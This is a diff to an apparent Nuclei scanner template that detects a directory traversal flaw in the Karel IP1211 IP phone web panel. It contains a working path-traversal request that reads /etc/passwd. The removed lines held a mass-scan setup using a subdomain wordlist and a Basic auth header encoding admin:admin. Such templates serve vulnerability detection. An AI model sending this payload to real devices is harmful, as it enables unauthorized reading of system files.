@@ -4,22 +4,14 @@ info:
   name: Karel IP Phone IP1211 Web Management Panel - Directory Traversal
   author: 0x_Akoko
   severity: high
-  reference:
-    - https://cxsecurity.com/issue/WLB-2020100038
-    - https://www.karel.com.tr/urun-cozum/ip1211-ip-telefon
+  reference: https://cxsecurity.com/issue/WLB-2020100038
   tags: karel,lfi
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/cgiServer.exx?page=../../../../../../../../../../../etc/passwd"
 
-    raw:
-      - |
-        GET /cgi-bin/cgiServer.exx?page=../../../../../../../../../../../etc/passwd HTTP/1.1
-        Host: {{Subdomains}}
-        Authorization: Basic YWRtaW46YWRtaW4=
     matchers-condition: and
     matchers:
 
